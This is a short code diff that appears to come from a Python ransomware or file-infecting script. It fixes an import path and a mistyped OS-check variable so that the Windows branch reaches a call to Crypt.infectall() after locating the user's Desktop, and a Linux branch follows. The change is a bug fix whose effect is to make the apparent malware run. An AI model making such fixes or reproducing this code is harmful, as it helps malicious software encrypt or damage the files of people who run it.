@@ -1,5 +1,5 @@
-from func import Crypt
-from func import k
+from Func import Crypt
+from Func import k
 import os
 import platform
 import shutil
@@ -7,7 +7,7 @@ from winreg import *
 
 s = platform.system()
 
-if mc=='Windows':
+if s=='Windows':
 	try:
 		desktop = os.path.expanduser('~/Desktop')
 	except:
@@ -61,7 +61,7 @@ if mc=='Windows':
 
 	Crypt.infectall()
 
-elif mc=='Linux':
+elif s=='Linux':
 	try:
 		desktop = os.path.expanduser('~/Desktop')
 	except:
